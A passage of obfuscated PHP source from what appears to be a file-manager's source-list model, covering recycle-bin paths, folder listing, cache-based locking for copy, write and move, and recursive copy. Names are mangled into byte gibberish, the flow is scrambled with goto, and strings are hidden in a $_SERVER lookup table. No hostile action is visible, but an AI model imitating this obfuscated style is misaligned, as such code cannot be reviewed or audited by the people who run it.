$dºÈæÓ„í˜)); if (count($dºÈæÓ„í˜) == 1) { $eöÈÍˆšÖ® = $this->sourceInfo($dºÈæÓ„í˜[0]); $B¿ìÍ“è¹Œ = is_array($eöÈÍˆšÖ®) ? array($eöÈÍˆšÖ®) : !1; } else { $B¿ìÍ“è¹Œ = $this->field($AƒÑèè§±ì[502])->where($bŒ¿ƒË‰³Ç)->select(); } if (!$B¿ìÍ“è¹Œ) { $B¿ìÍ“è¹Œ = array(); } foreach ($B¿ìÍ“è¹Œ as $FåÏ¹¯Ÿõ©) { $bàê‰ù·Õ[$FåÏ¹¯Ÿõ©[$AƒÑèè§±ì[404]]] = $FåÏ¹¯Ÿõ©[$AƒÑèè§±ì[28]]; } } $B¢‚ó¯»…‹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto B±ì¦Å‰‚; B…ŠŞ¦±ª—: $AƒÑèè§±ì =& $_SERVER[úÉ·öƒÑì©]; static $bàê‰ù·Õ = array(); $dºÈæÓ„í˜ = array(); goto D°¸È‰»íç; D°¸È‰»íç: $f’ÇÏ¿‚»ª = array(); foreach ($bñ‰çÃïíÇ as &$EÎ“­ôóé¦) { $cà² ‹¾È = $EÎ“­ôóé¦[$AƒÑèè§±ì[412]] == $AƒÑèè§±ì[87]; if ($cà² ‹¾È) { $bàê‰ù·Õ[$EÎ“­ôóé¦[$AƒÑèè§±ì[404]]] = $EÎ“­ôóé¦[$AƒÑèè§±ì[28]]; } if (isset($f’ÇÏ¿‚»ª[$EÎ“­ôóé¦[$AƒÑèè§±ì[496]]])) { continue; } $f’ÇÏ¿‚»ª[$EÎ“­ôóé¦[$AƒÑèè§±ì[496]]] = !0; $e¶ÒœÓ’‹ = $this->parentLevelArray($EÎ“­ôóé¦[$AƒÑèè§±ì[496]]); foreach ($e¶ÒœÓ’‹ as $BÚëÒ°ŞÖ => $Cˆ”†™µãœ) { if ($BÚëÒ°ŞÖ != 0 && !isset($bàê‰ù·Õ[$Cˆ”†™µãœ])) { $dºÈæÓ„í˜[] = $Cˆ”†™µãœ; } } } unset($EÎ“­ôóé¦); goto EÉ‡Å’Š˜÷; D£‡âÒè¹: } private function _listAppendPathRecycle(&$E×‚µÖí³¨, $bÔš­Š³†, $F£²Ç‚…ÊÆ) { goto d™Æ¶‚í÷; d™Æ¶‚í÷: $aÄÆ¢ÅŞ =& $_SERVER[úÉ·öƒÑì©]; if (!in_array($F£²Ç‚…ÊÆ, $bÔš­Š³†) && $E×‚µÖí³¨[$aÄÆ¢ÅŞ[404]] != $F£²Ç‚…ÊÆ) { return; } $f‡´’ÄÛÅ = explode($aÄÆ¢ÅŞ[8], trim($E×‚µÖí³¨[$aÄÆ¢ÅŞ[504]], $aÄÆ¢ÅŞ[8])); goto eÊ„É¦ŸèÇ; EÃÜóÂ¿Ü‰: if ($E×‚µÖí³¨[$aÄÆ¢ÅŞ[404]] == $F£²Ç‚…ÊÆ) { $E×‚µÖí³¨[$aÄÆ¢ÅŞ[496]] = $aÄÆ¢ÅŞ[507]; $E×‚µÖí³¨[$aÄÆ¢ÅŞ[487]] = $aÄÆ¢ÅŞ[191]; $E×‚µÖí³¨[$aÄÆ¢ÅŞ[28]] = LNG($aÄÆ¢ÅŞ[506]); } $E×‚µÖí³¨[$aÄÆ¢ÅŞ[508]] = $aÄÆ¢ÅŞ[509]; goto EóÛöò¤Ìå; eÊ„É¦ŸèÇ: $fâàÙ¯Ó¼• = implode($aÄÆ¢ÅŞ[8], array_slice($f‡´’ÄÛÅ, 2)); $E×‚µÖí³¨[$aÄÆ¢ÅŞ[504]] = $aÄÆ¢ÅŞ[8] . LNG($aÄÆ¢ÅŞ[506]) . $aÄÆ¢ÅŞ[8] . ltrim($fâàÙ¯Ó¼•, $aÄÆ¢ÅŞ[8]); $E×‚µÖí³¨[$aÄÆ¢ÅŞ[496]] = $aÄÆ¢ÅŞ[507] . implode($aÄÆ¢ÅŞ[47], array_slice($bÔš­Š³†, 1)) . $aÄÆ¢ÅŞ[47]; goto EÃÜóÂ¿Ü‰; EóÛöò¤Ìå: } protected function _listAppendPathRoot(&$F·ÀììÆ©, $f¥áÓ«Œõ«) { $D“¦ŞÁÅ¼è =& $_SERVER[úÉ·öƒÑì©]; $aÍ®ˆ•±Ù¼ = $D“¦ŞÁÅ¼è[33]; if ($F·ÀììÆ©[$D“¦ŞÁÅ¼è[413]] == self::TYPE_USER) { if (defined($D“¦ŞÁÅ¼è[463]) && $F·ÀììÆ©[$D“¦ŞÁÅ¼è[493]] == USER_ID) { $aÍ®ˆ•±Ù¼ = LNG($D“¦ŞÁÅ¼è[510]); if (!$f¥áÓ«Œõ«) { $F·ÀììÆ©[$D“¦ŞÁÅ¼è[28]] = $aÍ®ˆ•±Ù¼; } } else { $BÂ¸¿Ô¢öœ = Model($D“¦ŞÁÅ¼è[511])->getInfoSimple($F·ÀììÆ©[$D“¦ŞÁÅ¼è[493]]); $aÍ®ˆ•±Ù¼ = LNG($D“¦ŞÁÅ¼è[512]) . $D“¦ŞÁÅ¼è[160] . $BÂ¸¿Ô¢öœ[$D“¦ŞÁÅ¼è[28]] . $D“¦ŞÁÅ¼è[513]; } } else { if ($F·ÀììÆ©[$D“¦ŞÁÅ¼è[413]] == self::TYPE_GROUP) { $BÂ¸¿Ô¢öœ = Model($D“¦ŞÁÅ¼è[495])->getInfoSimple($F·ÀììÆ©[$D“¦ŞÁÅ¼è[493]]); $aÍ®ˆ•±Ù¼ = $BÂ¸¿Ô¢öœ[$D“¦ŞÁÅ¼è[28]]; } else { if ($F·ÀììÆ©[$D“¦ŞÁÅ¼è[413]] == self::TYPE_SYSTEM) { $aÍ®ˆ•±Ù¼ = $D“¦ŞÁÅ¼è[514]; } } } $aÍ®ˆ•±Ù¼ = $aÍ®ˆ•±Ù¼ ? $D“¦ŞÁÅ¼è[8] . $aÍ®ˆ•±Ù¼ . $D“¦ŞÁÅ¼è[8] : $D“¦ŞÁÅ¼è[8]; return $aÍ®ˆ•±Ù¼; } protected function _listAppendUser(&$Fó©µì³¦) { goto a–­…™Ü; a–­…™Ü: $c÷²¯ë¸ =& $_SERVER[úÉ·öƒÑì©]; $FßÙç£…¡“ = array_to_keyvalue($Fó©µì³¦, $c÷²¯ë¸[33], $c÷²¯ë¸[441]); $eÜÕİŞ£¶ = array_to_keyvalue($Fó©µì³¦, $c÷²¯ë¸[33], $c÷²¯ë¸[443]); goto bÅ¼öÛ°¿­; Bƒ¹õ…º…Å: unset($A›·ÌÌµØÊ); goto A±¨ˆÜÊñ; bÅ¼öÛ°¿­: $FÔä®ÈøÀ‚ = array_merge($FßÙç£…¡“, $eÜÕİŞ£¶); $F·Ò‹§£ å = Model($c÷²¯ë¸[515])->userListInfo($FÔä®ÈøÀ‚); foreach ($Fó©µì³¦ as &$A›·ÌÌµØÊ) { $EŒÄšÅ«É = $A›·ÌÌµØÊ[$c÷²¯ë¸[441]]; $A›·ÌÌµØÊ[$c÷²¯ë¸[441]] = $F·Ò‹§£ å[$EŒÄšÅ«É] ? $F·Ò‹§£ å[$EŒÄšÅ«É] : !1; $EŒÄšÅ«É = $A›·ÌÌµØÊ[$c÷²¯ë¸[443]]; $A›·ÌÌµØÊ[$c÷²¯ë¸[443]] = $F·Ò‹§£ å[$EŒÄšÅ«É] ? $F·Ò‹§£ å[$EŒÄšÅ«É] : !1; if (isset($A›·ÌÌµØÊ[$c÷²¯ë¸[454]]) && $A›·ÌÌµØÊ[$c÷²¯ë¸[454]][$c÷²¯ë¸[516]]) { $Eé¨éÆ‹ Ë = $GLOBALS[$c÷²¯ë¸[6]][$c÷²¯ë¸[88]][$c÷²¯ë¸[517]]; if ($A›·ÌÌµØÊ[$c÷²¯ë¸[454]][$c÷²¯ë¸[518]] <= time() - $Eé¨éÆ‹ Ë) { $this->metaSet($A›·ÌÌµØÊ[$c÷²¯ë¸[404]], $c÷²¯ë¸[516], null); $this->metaSet($A›·ÌÌµØÊ[$c÷²¯ë¸[404]], $c÷²¯ë¸[518], null); unset($A›·ÌÌµØÊ[$c÷²¯ë¸[454]][$c÷²¯ë¸[516]]); continue; } $B‡„ë‡Ü÷› = $A›·ÌÌµØÊ[$c÷²¯ë¸[454]][$c÷²¯ë¸[516]]; $A›·ÌÌµØÊ[$c÷²¯ë¸[454]][$c÷²¯ë¸[519]] = Model($c÷²¯ë¸[515])->getInfoSimpleOuter($B‡„ë‡Ü÷›); } } goto Bƒ¹õ…º…Å; A±¨ˆÜÊñ: } public function parentLevelArray($b©ªœ›°¾Á) { $eã™ã¾»Ùğ =& $_SERVER[úÉ·öƒÑì©]; $b©ªœ›°¾Á = explode($eã™ã¾»Ùğ[47], trim($b©ªœ›°¾Á, $eã™ã¾»Ùğ[47])); return array_remove_value($b©ªœ›°¾Á, $eã™ã¾»Ùğ[191]); } public function listAll($bˆÃµ„¿ğ) { goto d…ÀÀÖáê¬; d…ÀÀÖáê¬: $d‚É¢õßÔ =& $_SERVER[úÉ·öƒÑì©]; $F×·ë„Æİé = $this->sourceInfo($bˆÃµ„¿ğ); $E°òÊ°³ª = array($d‚É¢õßÔ[520] => array($d‚É¢õßÔ[521], $F×·ë„Æİé[$d‚É¢õßÔ[496]] . $bˆÃµ„¿ğ . $d‚É¢õßÔ[522]), $d‚É¢õßÔ[523] => 0); goto bçÛ’Ë”¹Ä; bçÛ’Ë”¹Ä: $E‰Šƒ‚ÍĞ = $d‚É¢õßÔ[524]; $bÆ”…õ½áå = "\x4c\x45\x46\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\151\x6c\145\40\157\x6e\x20\x73\x6f\x75\162\143\x65\x2e\x66\x69\154\x65\111\x44\x20\75\x20\146\151\154\x65\56\x66\x69\x6c\145\x49\104"; $aĞ‹ŒÁË„ = $this->alias($d‚É¢õßÔ[525])->field($E‰Šƒ‚ÍĞ)->where($E°òÊ°³ª)->join($bÆ”…õ½áå)->select(); goto c÷Âñ‚ˆ¯à; A‡Œ©îÇÄĞ: $d«®æ¢Ç¼£ = array(); foreach ($aĞ‹ŒÁË„ as $cËÄÌÎ¬¸£ => $b»šäŒòÚ¸) { goto e¹…ß¦ˆ¯·; f…ßö¶¥†È: if (!$b»šäŒòÚ¸[$d‚É¢õßÔ[412]]) { $D¶×³Š¿ÒÒ[$d‚É¢õßÔ[456]] = $b»šäŒòÚ¸[$d‚É¢õßÔ[456]]; $D¶×³Š¿ÒÒ[$d‚É¢õßÔ[86]] = $b»šäŒòÚ¸[$d‚É¢õßÔ[76]]; } $d«®æ¢Ç¼£[] = $D¶×³Š¿ÒÒ; goto F„Å«Ø‚î; A‡Ä™Â‡æ: for ($a¨õÕˆ´¯ = 0; $a¨õÕˆ´¯ < count($Dƒ‚¬½×…); $a¨õÕˆ´¯++) { $A†¼ª…¨øÃ .= $aĞ‹ŒÁË„[$Dƒ‚¬½×…[$a¨õÕˆ´¯]][$d‚É¢õßÔ[28]] . $d‚É¢õßÔ[8]; } $A†¼ª…¨øÃ .= $b»šäŒòÚ¸[$d‚É¢õßÔ[28]]; if ($b»šäŒòÚ¸[$d‚É¢õßÔ[412]]) { $A†¼ª…¨øÃ .= $d‚É¢õßÔ[8]; } goto aŒò·Üàì; e¹…ß¦ˆ¯·: $Dƒ‚¬½×… = $this->parentLevelArray($b»šäŒòÚ¸[$d‚É¢õßÔ[496]]); array_shift($Dƒ‚¬½×…); $A†¼ª…¨øÃ = $eªˆç’˜˜š; goto A‡Ä™Â‡æ; aŒò·Üàì: $A†¼ª…¨øÃ = str_replace($d‚É¢õßÔ[505], $d‚É¢õßÔ[8], $A†¼ª…¨øÃ); $A†¼ª…¨øÃ = str_replace($d‚É¢õßÔ[505], $d‚É¢õßÔ[8], $A†¼ª…¨øÃ); $D¶×³Š¿ÒÒ = array($d‚É¢õßÔ[423] => str_replace($d‚É¢õßÔ[505], $d‚É¢õßÔ[8], $A†¼ª…¨øÃ), $d‚É¢õßÔ[526] => intval($b»šäŒòÚ¸[$d‚É¢õßÔ[412]]), $d‚É¢õßÔ[85] => $this->pathInfoFilter($b»šäŒòÚ¸)); goto f…ßö¶¥†È; F„Å«Ø‚î: } return $d«®æ¢Ç¼£; goto b³†”£ÕàÛ; c÷Âñ‚ˆ¯à: $this->_listAppendAuth($aĞ‹ŒÁË„); $this->_listAppendUser($aĞ‹ŒÁË„); $this->_listAppendPath($aĞ‹ŒÁË„); goto e··º‘‡Ş¼; e··º‘‡Ş¼: $aĞ‹ŒÁË„ = array_to_keyvalue($aĞ‹ŒÁË„, $d‚É¢õßÔ[404]); $eªˆç’˜˜š = "\x2f{$F×·ë„Æİé[$d‚É¢õßÔ[28]]}\x2f"; $eªˆç’˜˜š = $eªˆç’˜˜š == $d‚É¢õßÔ[505] ? $d‚É¢õßÔ[8] : $eªˆç’˜˜š; goto A‡Œ©îÇÄĞ; b³†”£ÕàÛ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($bó÷«â·Ö®) { goto F—ìà£‘¤; f”‰á²íí¦: $a«©¢­ = 1; $this->_lockEvent($bó÷«â·Ö®, array($AÄ–ßÔ‚‚„[528], $AÄ–ßÔ‚‚„[529]), $a«©¢­); $this->_lockParent($bó÷«â·Ö®, array($AÄ–ßÔ‚‚„[529]), $a«©¢­); goto b¨ÃÅå¾³Ï; F—ìà£‘¤: $AÄ–ßÔ‚‚„ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÄ–ßÔ‚‚„[527], $bó÷«â·Ö®); goto f”‰á²íí¦; b¨ÃÅå¾³Ï: $this->_lockEvent($bó÷«â·Ö®, array($AÄ–ßÔ‚‚„[530], $AÄ–ßÔ‚‚„[531]), $a«©¢­); $this->_lockCheckEnd($AÄ–ßÔ‚‚„[527], $bó÷«â·Ö®); goto d¥£µÊ‡Ê; d¥£µÊ‡Ê: } public function lockCopyEnd($dÌÖÖÄô´í) { $Bñ–ÇŠó¯ª =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $Aİ‹šÏÈÊ® = 0; $this->_lockEvent($dÌÖÖÄô´í, array($Bñ–ÇŠó¯ª[528], $Bñ–ÇŠó¯ª[529]), $Aİ‹šÏÈÊ®); $this->_lockParent($dÌÖÖÄô´í, array($Bñ–ÇŠó¯ª[529]), $Aİ‹šÏÈÊ®); $this->_lockEvent($dÌÖÖÄô´í, array($Bñ–ÇŠó¯ª[530], $Bñ–ÇŠó¯ª[531]), $Aİ‹šÏÈÊ®); } public function lockWriteStart($aÔ”Æ•Á…, $e¥¶ÍšîºÄ = '') { goto bèÇÆÅô³Ş; bèÇÆÅô³Ş: $F—²ğ©¹¢Ç =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $this->_lockCheck($F—²ğ©¹¢Ç[528], $aÔ”Æ•Á…); goto eÈäÂ¥ÎÀÏ; eÈäÂ¥ÎÀÏ: $Eª©ä¨ Àà = 1; $this->_lockKey($F—²ğ©¹¢Ç[532] . $aÔ”Æ•Á… . $F—²ğ©¹¢Ç[95] . $e¥¶ÍšîºÄ, $Eª©ä¨ Àà); $this->_lockEvent($aÔ”Æ•Á…, array($F—²ğ©¹¢Ç[527], $F—²ğ©¹¢Ç[529]), $Eª©ä¨ Àà); goto a™ÏºßùéÑ; a™ÏºßùéÑ: $this->_lockParent($aÔ”Æ•Á…, array($F—²ğ©¹¢Ç[527], $F—²ğ©¹¢Ç[529]), $Eª©ä¨ Àà); $this->_lockCheckEnd($F—²ğ©¹¢Ç[528], $aÔ”Æ•Á…); goto a…§½ˆáöé; a…§½ˆáöé: } public function lockWriteEnd($cóÈ°êË–à, $b‹ç•²Î‡‹ = '') { $Dƒ¾ééÍçÅ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $F±ô¹‡“¨Ò = 0; $this->_lockKey($Dƒ¾ééÍçÅ[532] . $cóÈ°êË–à . $Dƒ¾ééÍçÅ[95] . $b‹ç•²Î‡‹, $F±ô¹‡“¨Ò); $this->_lockEvent($cóÈ°êË–à, array($Dƒ¾ééÍçÅ[527], $Dƒ¾ééÍçÅ[529]), $F±ô¹‡“¨Ò); $this->_lockParent($cóÈ°êË–à, array($Dƒ¾ééÍçÅ[527], $Dƒ¾ééÍçÅ[529]), $F±ô¹‡“¨Ò); } public function lockMoveStart($f¶Õ¨ƒæ–Ô) { goto aá¹¦„¯; aá¹¦„¯: $DªêÇÍ¶õ² =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $this->_lockCheck($DªêÇÍ¶õ²[529], $f¶Õ¨ƒæ–Ô); goto cß”ËîÄ; b†Œä„Œì¤: $this->_lockParent($f¶Õ¨ƒæ–Ô, array($DªêÇÍ¶õ²[527], $DªêÇÍ¶õ²[529]), $fÊ›µ›è”°); $this->_lockEvent($f¶Õ¨ƒæ–Ô, array($DªêÇÍ¶õ²[534], $DªêÇÍ¶õ²[530], $DªêÇÍ¶õ²[531]), $fÊ›µ›è”°); $this->_lockCheckEnd($DªêÇÍ¶õ²[529], $f¶Õ¨ƒæ–Ô); goto EšËßˆ‡Ÿ‘; cß”ËîÄ: $fÊ›µ›è”° = 1; $this->_lockKey($DªêÇÍ¶õ²[533] . $f¶Õ¨ƒæ–Ô, $fÊ›µ›è”°); $this->_lockEvent($f¶Õ¨ƒæ–Ô, array($DªêÇÍ¶õ²[527], $DªêÇÍ¶õ²[528]), $fÊ›µ›è”°); goto b†Œä„Œì¤; EšËßˆ‡Ÿ‘: } public function lockMoveEnd($c´¹Ò‹ÏÛ‘) { goto fŞ±Ù©¤Éê; d†À±ƒñ’: $this->_lockEvent($c´¹Ò‹ÏÛ‘, array($CŒòš¼ê¦[534], $CŒòš¼ê¦[530], $CŒòš¼ê¦[531]), $b„® ˆÀñ); goto dÓ§ØÚéö¨; cÓ©¼ˆ õ: $this->_lockKey($CŒòš¼ê¦[533] . $c´¹Ò‹ÏÛ‘, $b„® ˆÀñ); $this->_lockEvent($c´¹Ò‹ÏÛ‘, array($CŒòš¼ê¦[527], $CŒòš¼ê¦[528]), $b„® ˆÀñ); $this->_lockParent($c´¹Ò‹ÏÛ‘, array($CŒòš¼ê¦[527], $CŒòš¼ê¦[529]), $b„® ˆÀñ); goto d†À±ƒñ’; fŞ±Ù©¤Éê: $CŒòš¼ê¦ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->allowLock()) { return; } $b„® ˆÀñ = 0; goto cÓ©¼ˆ õ; dÓ§ØÚéö¨: } private function _lockCheck($C™…§ÂÖæ¿, $F‰‹í’Æšº) { goto f°“¾–Ÿ·; D¡ ÅØ‹¬: $Eƒ”„³ÆÖ  = array_reverse($this->parentLevelArray($Dî‰ïÔñ’ß[$BÕŸ’®Ëêƒ[496]])); foreach ($Eƒ”„³ÆÖ  as $F‘‰öÉÅà¦) { $d™ö™Ô§½â = $C™…§ÂÖæ¿ . $BÕŸ’®Ëêƒ[536] . $F‘‰öÉÅà¦; if (CacheLock::lockGet($BÕŸ’®Ëêƒ[537] . $d™ö™Ô§½â)) { $Dî‰ïÔñ’ß = $this->sourceInfo($F‘‰öÉÅà¦); CacheLock::setErrorMsg($BÕŸ’®Ëêƒ[160] . htmlspecialchars($Dî‰ïÔñ’ß[$BÕŸ’®Ëêƒ[28]]) . $BÕŸ’®Ëêƒ[513] . $dë”ÊÈŒ„); $this->_lockKey($d™ö™Ô§½â, 1); $this->_lockKey($d™ö™Ô§½â, 0); } } goto AÅ£Üª•‹‹; f°“¾–Ÿ·: $BÕŸ’®Ëêƒ =& $_SERVER[úÉ·öƒÑì©]; $Dî‰ïÔñ’ß = $this->sourceInfo($F‰‹í’Æšº); $d™ö™Ô§½â = $C™…§ÂÖæ¿ . $BÕŸ’®Ëêƒ[95] . $F‰‹í’Æšº; goto f½×õ¨¦¯’; D´ˆğ¢—íí: CacheLock::setErrorMsg($BÕŸ’®Ëêƒ[160] . htmlspecialchars($Dî‰ïÔñ’ß[$BÕŸ’®Ëêƒ[28]]) . $BÕŸ’®Ëêƒ[513] . $dë”ÊÈŒ„); $this->_lockKey($d™ö™Ô§½â, 1); $this->_lockKey($d™ö™Ô§½â, 0); goto D¡ ÅØ‹¬; f½×õ¨¦¯’: $this->_lockTimeStart[$d™ö™Ô§½â] = timeFloat(); if (!is_array($Dî‰ïÔñ’ß)) { return; } $dë”ÊÈŒ„ = LNG($BÕŸ’®Ëêƒ[535]); goto D´ˆğ¢—íí; AÅ£Üª•‹‹: } private function _lockCheckEnd($bêÅŞâ’¦‘, $B† ƒİ…Æá) { goto Eõâøâ‘; fÆ©ï©„“: if ($bÁÙé¦—ƒ > 0.5) { unset(self::$cacheSourceInfo[$EèùáÙÓƒ˜[447] . $B† ƒİ…Æá]); } $aô®·æƒÂ = $this->sourceInfo($B† ƒİ…Æá); if (!$aô®·æƒÂ) { show_json(LNG($EèùáÙÓƒ˜[105]), !1); } goto Fëæ·ØÏİ; Eİä¯„ò: if (!isset($this->_lockTimeStart[$b»«ªÒ»])) { return; } $bÁÙé¦—ƒ = timeFloat() - $this->_lockTimeStart[$b»«ªÒ»]; unset($this->_lockTimeStart[$b»«ªÒ»]); goto fÆ©ï©„“; Eõâøâ‘: $EèùáÙÓƒ˜ =& $_SERVER[úÉ·öƒÑì©]; $b»«ªÒ» = $bêÅŞâ’¦‘ . $EèùáÙÓƒ˜[95] . $B† ƒİ…Æá; CacheLock::setErrorMsg($EèùáÙÓƒ˜[384]); goto Eİä¯„ò; Fëæ·ØÏİ: } private function _lockParent($E±öŒêÂ„µ, $c–ÃçˆÛ”, $AÅÃÒ–†³) { if (!$this->autoLockSet) { return; } $d´°×œ¶¢ = $this->sourceInfo($E±öŒêÂ„µ); if (!is_array($d´°×œ¶¢)) { return; } $BÌÍáÇ¼÷ = array_reverse($this->parentLevelArray($d´°×œ¶¢[$_SERVER[úÉ·öƒÑì©][496]])); foreach ($BÌÍáÇ¼÷ as $fŠ‰êÖé°Ã) { $this->_lockEvent($fŠ‰êÖé°Ã, $c–ÃçˆÛ”, $AÅÃÒ–†³); } } private function _lockEvent($a‹Ö”ƒÛä˜, $Cƒ±ï«’Ï, $Câ›Øñ„ò) { $Dˆô«šÑõ¡ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->autoLockSet) { return; } foreach ($Cƒ±ï«’Ï as $dôÑéİïŒ¥) { $E—µèÛÄ×¡ = $dôÑéİïŒ¥ . $Dˆô«šÑõ¡[95] . $a‹Ö”ƒÛä˜; if ($Câ›Øñ„ò && CacheLock::lockGet($Dˆô«šÑõ¡[537] . $E—µèÛÄ×¡)) { continue; } $this->_lockKey($E—µèÛÄ×¡, $Câ›Øñ„ò); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aÌ™ØìÕĞ, $A‰ä˜Ü®ˆ = 1) { $c¯šÑ’¾Í¢ = $_SERVER[úÉ·öƒÑì©][537] . md5($aÌ™ØìÕĞ); if ($A‰ä˜Ü®ˆ) { if (isset(self::$_lockItemArr[$c¯šÑ’¾Í¢])) { return; } self::$_lockItemArr[$c¯šÑ’¾Í¢] = 1; CacheLock::lock($c¯šÑ’¾Í¢, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$c¯šÑ’¾Í¢])) { return; } unset(self::$_lockItemArr[$c¯šÑ’¾Í¢]); CacheLock::unlock($c¯šÑ’¾Í¢); } } public function isParentOf($cØà½á­¯, $BÄ¡„ºËĞÚ) { goto AøÙ÷¹¿; C­ò’±¹: $aËßğ±§ì = $FÁ«¸Êê—°[$DÆ¢ÕÁ—©[496]] . $FÁ«¸Êê—°[$DÆ¢ÕÁ—©[404]] . $DÆ¢ÕÁ—©[47]; $CŠğª¼—¿ = $D¡‹ŸÄ‹Óœ[$DÆ¢ÕÁ—©[496]] . $D¡‹ŸÄ‹Óœ[$DÆ¢ÕÁ—©[404]] . $DÆ¢ÕÁ—©[47]; $FÎ»õ…Š¥Ï = strpos($CŠğª¼—¿, $aËßğ±§ì) === 0; goto D¯‘Á­ªŒ¤; AøÙ÷¹¿: $DÆ¢ÕÁ—© =& $_SERVER[úÉ·öƒÑì©]; $FÁ«¸Êê—° = $this->sourceInfo($cØà½á­¯); $D¡‹ŸÄ‹Óœ = $this->sourceInfo($BÄ¡„ºËĞÚ); goto C­ò’±¹; D¯‘Á­ªŒ¤: return $FÎ»õ…Š¥Ï; goto bï¬ÓÚ Åß; bï¬ÓÚ Åß: } private $targetIsDelete = 0; public function copy($b„…ğµçÄÈ, $B‹Õõ¨Èµ, $Fš¯ïÛÛ‰ = REPEAT_REPLACE, $B…¶£òÏ‹™ = '') { goto cÌ™£—Ç; fòµÅ³»ÇÛ: if (!$cÙ•ˆ“Í‡ || !$FÅÉí || $FÅÉí[$f²ØõŒ¦[412]] != $f²ØõŒ¦[87]) { return !1; } if ($this->isParentOf($b„…ğµçÄÈ, $B‹Õõ¨Èµ)) { return !1; } $f–•ÖÖº·¢ = $B…¶£òÏ‹™ ? $B…¶£òÏ‹™ : $cÙ•ˆ“Í‡[$f²ØõŒ¦[28]]; goto e·Á…Â–¿; cøÁÂÌôÔÒ: $this->targetIsDelete = intval($cÙ•ˆ“Í‡[$f²ØõŒ¦[432]]); $fï‰ÔÔ¨ = $this->fileNameExistCache($B‹Õõ¨Èµ, $cÙ•ˆ“Í‡[$f²ØõŒ¦[28]]); $aº óŸø = $this->_copy($b„…ğµçÄÈ, $B‹Õõ¨Èµ, $Fš¯ïÛÛ‰, $a—¿œ·Œ˜Ü, !0, $B…¶£òÏ‹™); goto cªƒ¶ŞÍÜ; cªƒ¶ŞÍÜ: $this->_childrenListClear(); $this->lockCopyEnd($b„…ğµçÄÈ); $this->lockWriteEnd($B‹Õõ¨Èµ, $f–•ÖÖº·¢); goto E©±Ê±Ãø; e·Á…Â–¿: $this->lockCopyStart($b„…ğµçÄÈ); $this->lockWriteStart($B‹Õõ¨Èµ, $f–•ÖÖº·¢); $a—¿œ·Œ˜Ü = array($f²ØõŒ¦[538] => array(), $f²ØõŒ¦[539] => array(), $f²ØõŒ¦[540] => array()); goto cøÁÂÌôÔÒ; dóË•ĞŠˆ°: $this->saveAll($a—¿œ·Œ˜Ü[$f²ØõŒ¦[540]]); Model($f²ØõŒ¦[193])->linkAdd($a—¿œ·Œ˜Ü[$f²ØõŒ¦[538]]); $this->folderSizeReset($B‹Õõ¨Èµ); goto D¯‹ŞÓÏÚâ; D¯‹ŞÓÏÚâ: $this->updateModifyTime($B‹Õõ¨Èµ); return $aº óŸø; goto Aßóæºê; E©±Ê±Ãø: if ($cÙ•ˆ“Í‡[$f²ØõŒ¦[412]] == $f²ØõŒ¦[87] && $fï‰ÔÔ¨ == $aº óŸø) { $this->folderSizeResetChildren($fï‰ÔÔ¨); } Model($f²ØõŒ¦[541])->addAll($a—¿œ·Œ˜Ü[$f²ØõŒ¦[539]], array(), !0); if ($fï‰ÔÔ¨ != $aº óŸø || $cÙ•ˆ“Í‡[$f²ØõŒ¦[412]] == $f²ØõŒ¦[87]) { Model($f²ØõŒ¦[542])->eventCopy($aº óŸø); } goto dóË•ĞŠˆ°; cÌ™£—Ç: $f²ØõŒ¦ =& $_SERVER[úÉ·öƒÑì©]; $cÙ•ˆ“Í‡ = $this->sourceInfo($b„…ğµçÄÈ); $FÅÉí = $this->sourceInfo($B‹Õõ¨Èµ); goto fòµÅ³»ÇÛ; Aßóæºê: } private function _copy($B’ÄÌ‘¢±, $E¬¡äÀ¥, $E‹ĞÂ‹¤ÛĞ, &$FÏ¹áã…¯‘, $A½Úƒ¤ƒâ¢, $bœƒ›ºà = '') { goto e‹éšºÁ†•; f×Ä†„ªêç: return $bÇ¡ì¨ÜäŸ; goto DËÒòÏ¬; a›È„¸¤ßè: $aëÒ¥øà‡ù = $bœƒ›ºà ? $bœƒ›ºà : $B²§öŒğó²[$E×Ğ™ƒé²[28]]; $B‘¡¦Õ«°Ë = $this->fileNameExistCache($E¬¡äÀ¥, $aëÒ¥øà‡ù); if ($A½Úƒ¤ƒâ¢) { $this->_childrenAllMake($B’ÄÌ‘¢±); if ($E¯ŒŒÙí™ë && $B‘¡¦Õ«°Ë) { $this->_childrenAllMake($B‘¡¦Õ«°Ë); } } goto aØ¢·â„´Ã; e‹éšºÁ†•: $E×Ğ™ƒé² =& $_SERVER[úÉ·öƒÑì©]; $B²§öŒğó² = $this->sourceInfoCache($B’ÄÌ‘¢±); $E¯ŒŒÙí™ë = $B²§öŒğó²[$E×Ğ™ƒé²[412]] == $E×Ğ™ƒé²[87]; goto a›È„¸¤ßè; aØ¢·â„´Ã: if (!$B‘¡¦Õ«°Ë) { return $this->_copyCreate($B’ÄÌ‘¢±, $E¬¡äÀ¥, $aëÒ¥øà‡ù, $FÏ¹áã…¯‘); } $bÇ¡ì¨ÜäŸ = $B‘¡¦Õ«°Ë; if ($E¯ŒŒÙí™ë) { if ($E‹ĞÂ‹¤ÛĞ == REPEAT_RENAME_FOLDER) { $aëÒ¥øà‡ù = $this->fileNameAutoCache($E¬¡äÀ¥, $aëÒ¥øà‡ù, $E‹ĞÂ‹¤ÛĞ, $E¯ŒŒÙí™ë); $bÇ¡ì¨ÜäŸ = $this->_copyCreate($B’ÄÌ‘¢±, $E¬¡äÀ¥, $aëÒ¥øà‡ù, $FÏ¹áã…¯‘); } else { $FŒ­×öÙ‚ö = $this->_childrenList($B’ÄÌ‘¢±); foreach ($FŒ­×öÙ‚ö as $a— àÊšµ‹) { $this->_copy($a— àÊšµ‹[$E×Ğ™ƒé²[404]], $B‘¡¦Õ«°Ë, 